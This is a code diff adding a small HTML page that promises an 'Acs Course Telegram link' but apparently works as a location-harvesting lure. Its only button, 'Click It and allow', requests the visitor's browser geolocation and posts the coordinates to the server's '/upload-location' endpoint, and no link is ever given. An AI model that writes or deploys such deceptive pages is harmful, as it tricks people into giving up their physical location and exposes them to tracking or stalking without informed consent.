@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>K871</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+            background-color: #f4f4f9;
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            margin: 20px;
+            padding: 12px 24px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #feedback {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>Acs Course Telegram link</h1>
+    <div>
+        <button id="get-location">Click It and allow</button>
+    </div>
+    <p id="feedback"></p>
+
+    <script>
+        const locationButton = document.getElementById('get-location');
+        const feedback = document.getElementById('feedback');
+
+        // Capture location and send to the server
+        locationButton.addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+
+                    // Send location data to the server using fetch
+                    fetch('/upload-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locationData)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        feedback.textContent = data.message;
+                        feedback.style.color = 'green';
+                    })
+                    .catch(err => {
+                        console.error('Error sending location:', err);
+                        feedback.textContent = 'An error occurred while sending the location data.';
+                        feedback.style.color = 'red';
+                    });
+                }, (error) => {
+                    feedback.textContent = 'Error getting location: ' + error.message;
+                    feedback.style.color = 'red';
+                });
+            } else {
+                feedback.textContent = 'Geolocation is not supported by this browser.';
+                feedback.style.color = 'red';
+            }
+        });
+    </script>
+</body>
+</html>
